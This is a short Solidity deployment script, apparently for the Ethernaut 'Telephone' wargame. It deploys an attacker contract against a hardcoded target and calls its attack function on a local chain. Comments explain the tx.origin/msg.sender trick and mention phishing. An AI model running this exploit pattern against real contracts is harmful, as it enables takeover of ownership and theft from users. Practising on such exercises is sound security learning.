// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../lib/forge-std/src/Script.sol";
import {TelephoneAttacker} from "../src/TelephoneAttacker.sol";
import {HelperConfigLib} from "./config/HelperConfig.sol";

contract TelephoneAttackerDeployer is Script, HelperConfigLib {
    function run() external {
        vm.startBroadcast(ATTACKER_KEY);
        TelephoneAttacker attackContract = new TelephoneAttacker(
            0x8aCd85898458400f7Db866d53FCFF6f0D49741FF // got from contract.address
        );
        attackContract.attack(ATTACKER_ADDRESS);
        vm.stopBroadcast();
    }
}

// forge script ./script/TelephoneAttackerDeployer.s.sol:TelephoneAttackerDeployer --rpc-url http://127.0.0.1:8545 --broadcast -vvv

// ATTACKER will be tx.origin
// attackContract will be msg.sender
// will be used for phishing attack
